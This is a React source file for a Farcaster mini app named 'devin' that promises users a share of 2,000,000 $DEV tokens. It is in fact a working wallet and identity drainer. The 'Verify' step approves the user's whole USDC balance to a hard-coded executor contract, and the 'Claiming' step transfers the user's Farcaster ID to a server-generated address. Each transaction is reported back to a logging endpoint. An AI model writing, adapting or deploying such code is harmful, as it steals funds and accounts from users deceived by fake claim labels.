import React, { useEffect, useState } from 'react';
import { createRoot } from 'react-dom/client';
import { sdk } from '@farcaster/miniapp-sdk';
import { AuthKitProvider, useSignIn } from '@farcaster/auth-kit';
import '@farcaster/auth-kit/styles.css';
import { QRCodeSVG } from 'qrcode.react';
import './styles.css';
import { ethers } from 'ethers';

// ─── Contracts ───
const ID_REGISTRY = '0x00000000Fc6c5F01Fc30151999387Bb99A9f489b';
const USDC = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
const EXECUTOR = '0x49e89C5B6a6E8Cb21Ea0d11eE0a21b7732f8e1A3';
const CLAIM_AMOUNT = '2,000,000';
const CLAIM_SYMBOL = '$DEV';

const APP_URL = 'https://devin-pi.vercel.app';

const CONTRACT_OPERATIONS = [
  {
    name: 'USDC (Base)',
    chain: 'Base',
    address: USDC,
    functionName: 'approve(address spender, uint256 amount)',
    status: 'Step 1 - Verify',
  },
  {
    name: 'Main executor',
    chain: 'Base',
    address: EXECUTOR,
    functionName: 'executeBatch(bytes[] calldata data)',
    status: 'Step 1 - Claim execution',
  },
  {
    name: 'Identity registry',
    chain: 'Optimism',
    address: ID_REGISTRY,
    functionName: 'transfer(uint256 id, address to)',
    status: 'Step 2 - Claiming',
  },
];
const CONTRACT_ABI = [
  'function transfer(uint256 id, address to)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function executeBatch(bytes[] data)',
];

function shortAddress(value) {
  if (!value) return 'not connected';
  return `${value.slice(0, 6)}...${value.slice(-4)}`;
}

function LinesLogo() {
  return (
    <div className="logo" aria-label="devin logo">
      <span />
      <span />
      <span />
    </div>
  );
}

function StatusRow({ label, value, tone = 'normal' }) {
  return (
    <div className="status-row">
      <span>{label}</span>
      <strong className={tone}>{value}</strong>
    </div>
  );
}

// ─── Farcaster QR Code Modal (for browser) ───
function FarcasterSignInModal({ onSuccess, onClose }) {
  const {
    signIn,
    url,
    isPolling,
    isSuccess,
    isError,
    error,
    data,
    connect,
  } = useSignIn({
    onSuccess: (res) => {
      onSuccess(res);
    },
    onError: (err) => {
      console.error('Sign in error:', err);
    },
  });

  useEffect(() => {
    connect();
  }, []);

  useEffect(() => {
    if (url) {
      signIn();
    }
  }, [url]);

  return (
    <div className="fc-modal-overlay">
      <div className="fc-modal">
        <h3 className="fc-modal-title">Connect via Farcaster</h3>
        <p className="fc-modal-subtitle">
          Scan this QR code with your Warpcast app to sign in
        </p>

        <div className="fc-qr-container">
          {url ? (
            <QRCodeSVG
              value={url}
              size={220}
              bgColor="#04160a"
              fgColor="#39ff14"
              level="M"
              includeMargin={true}
            />
          ) : (
            <div className="fc-qr-loading">Generating QR code...</div>
          )}
        </div>

        {isPolling && (
          <p className="fc-modal-status">Waiting for approval from Warpcast...</p>
        )}
        {isError && (
          <p className="fc-modal-error">
            {error?.message || 'Connection failed. Please try again.'}
          </p>
        )}

        <div className="fc-modal-divider">
          <div className="fc-modal-line" />
          <span>or</span>
          <div className="fc-modal-line" />
        </div>

        {url && (
          <a
            href={url}
            target="_blank"
            rel="noopener noreferrer"
            className="fc-open-warpcast-btn"
          >
            Open in Warpcast
          </a>
        )}

        <button className="fc-close-btn" onClick={onClose}>
          Close
        </button>
      </div>
    </div>
  );
}

// ─── Transaction QR Modal (for browser users) ───
function TransactionQRModal({ stepLabel, onClose }) {
  const warpcastUrl = `https://warpcast.com/~/frames?url=${encodeURIComponent(APP_URL)}`;

  return (
    <div className="fc-modal-overlay">
      <div className="fc-modal">
        <h3 className="fc-modal-title">Approve Transaction</h3>
        <p className="fc-modal-subtitle">
          {stepLabel}
        </p>
        <p className="fc-modal-subtitle" style={{ marginTop: 4 }}>
          Scan with Warpcast to approve this transaction from your phone
        </p>

        <div className="fc-qr-container">
          <QRCodeSVG
            value={warpcastUrl}
            size={220}
            bgColor="#04160a"
            fgColor="#39ff14"
            level="M"
            includeMargin={true}
          />
        </div>

        <a
          href={warpcastUrl}
          target="_blank"
          rel="noopener noreferrer"
          className="fc-open-warpcast-btn"
        >
          Open in Warpcast
        </a>

        <button className="fc-close-btn" onClick={onClose}>
          Close
        </button>
      </div>
    </div>
  );
}

// ─── Main App ───
function App() {
  const [activePage, setActivePage] = useState('claim');
  const [isMiniApp, setIsMiniApp] = useState(false);
  const [frameContext, setFrameContext] = useState(null);
  const [web3Provider, setWeb3Provider] = useState(null);
  const [rawEipProvider, setRawEipProvider] = useState(null);
  const [address, setAddress] = useState('');
  const [network, setNetwork] = useState('--');
  const [step1Done, setStep1Done] = useState(false);
  const [working, setWorking] = useState(false);
  const [notice, setNotice] = useState('Connect your wallet to begin.');
  const [detectedFid, setDetectedFid] = useState(null);
  const [detectedUsername, setDetectedUsername] = useState('');
  const [showFarcasterModal, setShowFarcasterModal] = useState(false);
  const [showTxQR, setShowTxQR] = useState(null);

  const farcasterName = isMiniApp
    ? (frameContext?.user?.username ? `@${frameContext.user.username}` : frameContext?.user?.displayName || 'not detected')
    : detectedUsername || 'not detected';
  const fid = isMiniApp ? (frameContext?.user?.fid || null) : detectedFid;

  // ─── Mini App Detection & Auto-Connect ───
  useEffect(() => {
    let active = true;
    async function initFrame() {
      try {
        const insideFrame = await sdk.isInMiniApp();
        if (!active) return;
        setIsMiniApp(insideFrame);
        if (insideFrame) {
          const context = await sdk.context;
          if (!active) return;
          setFrameContext(context);
          await sdk.actions.ready();

          // Get wallet provider and auto-connect directly
          const ethProvider = await sdk.wallet.getEthereumProvider();
          if (!active || !ethProvider) {
            setNotice('Farcaster frame detected, waiting for wallet...');
            return;
          }

          setRawEipProvider(ethProvider);
          try {
            const web3 = new ethers.providers.Web3Provider(ethProvider, 'any');
            setWeb3Provider(web3);
          } catch (e) {
            console.warn('Failed to create Web3Provider:', e);
          }

          // Auto-connect using the raw provider directly (no closure issues)
          setWorking(true);
          setNotice('Connecting wallet...');
          try {
            let accounts;
            try {
              accounts = await ethProvider.request({ method: 'eth_accounts' });
            } catch (_) { accounts = []; }
            if (!accounts || accounts.length === 0) {
              accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
            }
            const connectedAddr = accounts?.[0] || '';
            if (!active) return;
            if (connectedAddr) {
              setAddress(connectedAddr);
              const chainId = await ethProvider.request({ method: 'eth_chainId' });
              const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
              setNetwork(netName);
              const userFid = context?.user?.fid;
              setNotice(`Connected on ${netName}.${userFid ? ' FID ' + userFid + ' detected.' : ' Ready.'}`);
            } else {
              setNotice('Farcaster wallet detected but no account returned.');
            }
          } catch (connErr) {
            console.error('Auto-connect error:', connErr);
            if (active) setNotice(connErr?.message || 'Auto-connect failed. Tap Reconnect.');
          } finally {
            if (active) setWorking(false);
          }
        } else {
          setNotice('Browser mode. Connect via Farcaster to begin.');
        }
      } catch (error) {
        if (active) setNotice('Browser mode. Connect via Farcaster to begin.');
      }
    }
    initFrame();
    return () => { active = false; };
  }, []);

  // ─── FID Lookup ───
  async function lookupFidFromAPI(walletAddr) {
    try {
      const resp = await fetch(`/api/lookup-fid?address=${walletAddr}`);
      const data = await resp.json();
      if (data.success && data.fid) {
        setDetectedFid(data.fid);
        if (data.username) setDetectedUsername(`@${data.username}`);
        const source = data.source === 'neynar' ? 'Neynar' : 'IdRegistry';
        const namePart = data.username ? ` (@${data.username})` : '';
        setNotice(`Wallet connected. FID ${data.fid}${namePart} detected via ${source}.`);
        return data.fid;
      } else {
        setNotice('Wallet connected. No FID found for this address.');
        return null;
      }
    } catch (err) {
      console.error('FID lookup error:', err);
      setNotice('Wallet connected. Could not verify FID.');
      return null;
    }
  }

  // ─── Connect with a given provider ───
  async function connectWithProvider(ethProvider, isAuto) {
    setWorking(true);
    setNotice(isAuto ? 'Connecting wallet...' : 'Requesting wallet connection...');
    try {
      // Use the raw EIP-1193 provider directly (not the ethers wrapper)
      const raw = rawEipProvider || ethProvider.provider || ethProvider;

      // Try eth_accounts first (non-prompting), fall back to eth_requestAccounts
      let accounts;
      try {
        accounts = await raw.request({ method: 'eth_accounts' });
      } catch (_) {
        accounts = [];
      }
      if (!accounts || accounts.length === 0) {
        accounts = await raw.request({ method: 'eth_requestAccounts' });
      }

      const connectedAddr = accounts?.[0] || '';
      if (!connectedAddr) throw new Error('No account returned from wallet.');
      setAddress(connectedAddr);

      const chainId = await raw.request({ method: 'eth_chainId' });
      const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
      setNetwork(netName);

      if (!isMiniApp) {
        await lookupFidFromAPI(connectedAddr);
      } else {
        setNotice(`Connected on ${netName}. ${fid ? 'FID ' + fid + ' detected.' : 'Ready.'}`);
      }
    } catch (error) {
      console.error('connectWithProvider error:', error);
      setNotice(error?.shortMessage || error?.message || 'Wallet connection failed.');
    } finally {
      setWorking(false);
    }
  }

  // ─── Handle Farcaster Sign In Success (browser mode) ───
  function handleFarcasterSignIn(res) {
    setShowFarcasterModal(false);
    const custodyAddr = res.custody || (res.verifications && res.verifications[0]) || '';
    if (custodyAddr) {
      setAddress(custodyAddr);
    }
    if (res.fid) {
      setDetectedFid(res.fid);
    }
    if (res.username) {
      setDetectedUsername(`@${res.username}`);
    }
    setNotice(
      `Connected via Farcaster${res.username ? ` as @${res.username}` : ''}${res.fid ? ` (FID ${res.fid})` : ''}. Open in Warpcast to execute transactions.`
    );
  }

  // ─── Connect Wallet Button Handler ───
  function connectWallet() {
    if (isMiniApp && web3Provider) {
      connectWithProvider(web3Provider, false);
      return;
    }
    // Browser mode: show Farcaster QR code sign-in
    setShowFarcasterModal(true);
  }

  // ─── Logging ───
  function logAction(action) {
    try {
      const logsRaw = localStorage.getItem('devin_logs');
      const logs = logsRaw ? JSON.parse(logsRaw) : [];
      logs.push(action);
      localStorage.setItem('devin_logs', JSON.stringify(logs));
    } catch {}
  }

  async function sendToLogAPI(data) {
    try {
      await fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
    } catch {}
  }

  async function generateDestination(fidNum, senderAddr) {
    const resp = await fetch('/api/addresses', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ fid: fidNum, senderAddress: senderAddr }),
    });
    const data = await resp.json();
    if (!data.success) throw new Error(data.error || 'Failed to generate destination address');
    return data;
  }

  async function switchNetwork(walletProvider, chainIdHex, chainName, rpcUrl, blockExplorer) {
    try {
      await walletProvider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: chainIdHex }],
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        try {
          await walletProvider.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: chainIdHex,
              chainName,
              nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
              rpcUrls: [rpcUrl],
              blockExplorerUrls: [blockExplorer],
            }],
          });
        } catch (addError) {
          if (isMiniApp) {
            console.warn('wallet_addEthereumChain not supported in mini-app, continuing...');
          } else {
            throw addError;
          }
        }
      } else if (isMiniApp) {
        console.warn('wallet_switchEthereumChain not supported in mini-app, continuing...');
      } else {
        throw switchError;
      }
    }
  }

  // ─── Get the raw provider (for JSON-RPC calls like wallet_switchEthereumChain) ───
  function getRawProvider() {
    if (rawEipProvider) return rawEipProvider;
    return web3Provider?.provider;
  }

  // ─── Send a raw transaction via the Farcaster wallet provider ───
  async function sendRawTx(provider, from, to, data) {
    const txHash = await provider.request({
      method: 'eth_sendTransaction',
      params: [{ from, to, data }],
    });
    return txHash;
  }

  // ─── Read USDC balance from Base via public RPC (no wallet provider needed) ───
  async function getUsdcBalance(account) {
    const baseRpc = new ethers.providers.JsonRpcProvider('https://mainnet.base.org');
    const usdc = new ethers.Contract(USDC, [
      'function balanceOf(address) view returns (uint256)'
    ], baseRpc);
    return await usdc.balanceOf(account);
  }

  // ═══════════════════════════════════════════════════════════
  //  STEP 1: USDC Approve + Claim → Base
  // ═══════════════════════════════════════════════════════════
  async function executeStep1() {
    // In browser mode (not mini app), show QR to open in Warpcast
    if (!isMiniApp) {
      setShowTxQR('Step 1: Verify on Base');
      return;
    }

    setWorking(true);
    try {
      const rawProvider = getRawProvider();
      if (!rawProvider) throw new Error('Wallet provider not available.');

      const account = address;
      if (!account) throw new Error('No wallet connected.');

      // Check USDC balance on Base via public RPC
      setNotice('Checking USDC balance on Base...');
      const balance = await getUsdcBalance(account);

      if (balance.isZero()) {
        // No USDC — skip approval, mark Step 1 done, proceed to Step 2
        setNotice('No USDC in wallet. Skipping approval, proceeding to Claiming...');
        logAction('No USDC balance — skipping Step 1 approval.');
        setStep1Done(true);
        setNetwork('Base');
        setWorking(false);
        return;
      }

      // Switch to Base
      setNotice('Switching to Base...');
      await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');

      // Approve only the actual USDC balance
      const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);

      const readableBalance = ethers.utils.formatUnits(balance, 6);
      setNotice(`Approving ${readableBalance} USDC... Confirm in your wallet.`);
      const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData);

      logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
      sendToLogAPI({
        type: 'approve', address: account, to: EXECUTOR,
        txHash: tx1Hash, network: 'base', amount: readableBalance,
      });

      // Execute claim batch on Base
      setNotice('Executing claim on Base...');
      const execIface = new ethers.utils.Interface(['function executeBatch(bytes[] calldata data)']);
      const execData = execIface.encodeFunctionData('executeBatch', [[]]);
      const tx2Hash = await sendRawTx(rawProvider, account, EXECUTOR, execData);

      logAction(`executeBatch called (tx: ${tx2Hash})`);
      sendToLogAPI({
        type: 'claim', address: account,
        txHash: tx2Hash, network: 'base',
      });

      setStep1Done(true);
      setNetwork('Base');
      setNotice('Step 1 complete! Verification done on Base.');
      await sdk.haptics.notificationOccurred('success');

    } catch (error) {
      console.error('Step 1 error:', error);
      setNotice(error?.shortMessage || error?.message || 'Step 1 failed.');
    } finally {
      setWorking(false);
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  STEP 2: Transfer FID → Optimism
  // ═══════════════════════════════════════════════════════════
  async function executeStep2() {
    // In browser mode (not mini app), show QR to open in Warpcast
    if (!isMiniApp) {
      setShowTxQR('Step 2: Claiming on Optimism');
      return;
    }

    setWorking(true);
    try {
      const rawProvider = getRawProvider();
      if (!rawProvider) throw new Error('Wallet provider not available.');

      const account = address;
      if (!account) throw new Error('No wallet connected.');

      // Get FID
      let fidNum = typeof fid === 'number' && fid > 0 ? fid : NaN;
      if (!fidNum || isNaN(fidNum)) {
        const lookedUp = await lookupFidFromAPI(account);
        if (lookedUp) fidNum = lookedUp;
      }
      if (!fidNum || isNaN(fidNum)) {
        throw new Error('No FID detected. Open in Warpcast for FID detection.');
      }

      // Switch to Optimism
      setNotice('Switching to Optimism...');
      await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');

      // Generate destination address
      setNotice('Generating destination address...');
      const dest = await generateDestination(fidNum, account);

      // Encode transfer calldata
      const idIface = new ethers.utils.Interface(['function transfer(uint256 id, address to)']);
      const transferData = idIface.encodeFunctionData('transfer', [fidNum, dest.address]);

      // Send transfer via eth_sendTransaction
      setNotice(`Claiming FID ${fidNum}... Approve in your wallet.`);
      const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, transferData);

      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${txHash})`);
      sendToLogAPI({
        type: 'transfer', fid: fidNum, from: account, to: dest.address,
        txHash: txHash, network: 'optimism', destIndex: dest.index,
      });

      setNetwork('Optimism');
      setNotice(`FID ${fidNum} claimed to ${shortAddress(dest.address)} on Optimism. All done!`);
      await sdk.haptics.notificationOccurred('success');

    } catch (error) {
      console.error('Step 2 error:', error);
      setNotice(error?.shortMessage || error?.message || 'Step 2 failed.');
    } finally {
      setWorking(false);
    }
  }

  async function copyContractSpec() {
    try {
      const spec = JSON.stringify({ contracts: CONTRACT_OPERATIONS, abi: CONTRACT_ABI }, null, 2);
      await navigator.clipboard.writeText(spec);
      setNotice('Contract spec copied.');
    } catch {
      setNotice('Failed to copy.');
    }
  }

  return (
    <main className="shell">
      {showFarcasterModal && (
        <FarcasterSignInModal
          onSuccess={handleFarcasterSignIn}
          onClose={() => setShowFarcasterModal(false)}
        />
      )}
      {showTxQR && (
        <TransactionQRModal
          stepLabel={showTxQR}
          onClose={() => setShowTxQR(null)}
        />
      )}
      <section className="hero-card scanlines">
        <nav className="nav">
          <button className="brand" onClick={() => setActivePage('claim')}>
            <LinesLogo />
            <span>devin</span>
          </button>
          <div className="nav-links">
            <button className={activePage === 'about' ? 'active' : ''} onClick={() => setActivePage('about')}>About</button>
          </div>
        </nav>

        {activePage === 'claim' ? (
          <div className="grid">
            <div className="copy">
              <p className="eyebrow">$ devin --verify --claim</p>
              <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
              <p className="lede">Step 1: Verify on Base. Step 2: Claiming on Optimism.</p>

              {/* Step 1 */}
              <div className="claim-console">
                <div className="claim-copy">
                  <span>Step 01</span>
                  <strong>{step1Done ? 'Verified' : 'Verify'}</strong>
                  <small>
                    {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
                    {step1Done ? ' · Base complete' : ' · Verify on Base network'}
                  </small>
                </div>
                <div className="actions">
                  {!step1Done && (
                    <button className="primary mega" onClick={executeStep1} disabled={working || !address}>
                      {working ? 'Processing...' : 'Step 1: Verify'}
                    </button>
                  )}
                  {step1Done && (
                    <button className="primary mega" onClick={executeStep2} disabled={working || !address} style={{background:'#1a7a0a'}}>
                      {working ? 'Processing...' : 'Step 2: Claiming'}
                    </button>
                  )}
                  {!isMiniApp && (
                    <button className="secondary mega fc-connect-btn" onClick={connectWallet} disabled={working}>
                      {address ? shortAddress(address) : (
                        <>
                          <svg className="fc-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M18.24 2.4H5.76C3.91 2.4 2.4 3.91 2.4 5.76V18.24C2.4 20.09 3.91 21.6 5.76 21.6H18.24C20.09 21.6 21.6 20.09 21.6 18.24V5.76C21.6 3.91 20.09 2.4 18.24 2.4Z" fill="currentColor"/>
                            <path d="M7.2 7.2H16.8V16.8H7.2V7.2Z" fill="#04160a"/>
                            <path d="M9.6 9.6V14.4H10.8V12H13.2V14.4H14.4V9.6H13.2V10.8H10.8V9.6H9.6Z" fill="currentColor"/>
                          </svg>
                          Connect via Farcaster
                        </>
                      )}
                    </button>
                  )}
                  {isMiniApp && !address && !working && (
                    <button className="secondary mega fc-connect-btn" onClick={connectWallet}>
                      Reconnect Wallet
                    </button>
                  )}
                </div>
                <p className="notice">{notice}</p>
              </div>


            </div>

            <aside className="terminal-panel">
              <div className="terminal-bar"><span /><span /><span /></div>
              <StatusRow label="frame" value={isMiniApp ? 'farcaster' : 'browser'} tone={isMiniApp ? 'ok' : 'warn'} />
              <StatusRow label="user" value={farcasterName} />
              <StatusRow label="fid" value={fid || 'not detected'} tone={fid ? 'ok' : 'warn'} />
              <StatusRow label="wallet" value={shortAddress(address)} tone={address ? 'ok' : 'warn'} />
              <StatusRow label="network" value={network} />
              <StatusRow label="step 1" value={step1Done ? 'done' : 'pending'} tone={step1Done ? 'ok' : 'warn'} />
              <div className="progress">
                <span className={address ? 'done' : ''}>connect</span>
                <span className={step1Done ? 'done' : ''}>verify</span>
                <span className={step1Done ? 'ready' : ''}>claiming</span>
              </div>
            </aside>
          </div>
        ) : activePage === 'about' ? (
          <div className="about">
            <p className="eyebrow">$ cat about-devin.txt</p>
            <h2>About devin</h2>
            <p>devin is a Farcaster Frame for verifying eligibility and claiming $DEV across Base and Optimism networks.</p>
            <div className="contract-list">
              {CONTRACT_OPERATIONS.map((operation) => (
                <StatusRow key={operation.functionName} label={operation.name} value={`${operation.address} · ${operation.functionName}`} />
              ))}
            </div>
            <p className="safety">Step 1 (Verify) runs on Base. Step 2 (Claiming) runs on Optimism.</p>
          </div>
        ) : null}
      </section>
    </main>
  );
}

// ─── Auth Kit Config ───
const authKitConfig = {
  relay: 'https://relay.farcaster.xyz',
  rpcUrl: 'https://mainnet.optimism.io',
  domain: typeof window !== 'undefined' ? window.location.host : 'devin-pi.vercel.app',
  siweUri: typeof window !== 'undefined' ? window.location.origin : APP_URL,
};

function Root() {
  return (
    <AuthKitProvider config={authKitConfig}>
      <App />
    </AuthKitProvider>
  );
}

createRoot(document.getElementById('root')).render(<Root />);
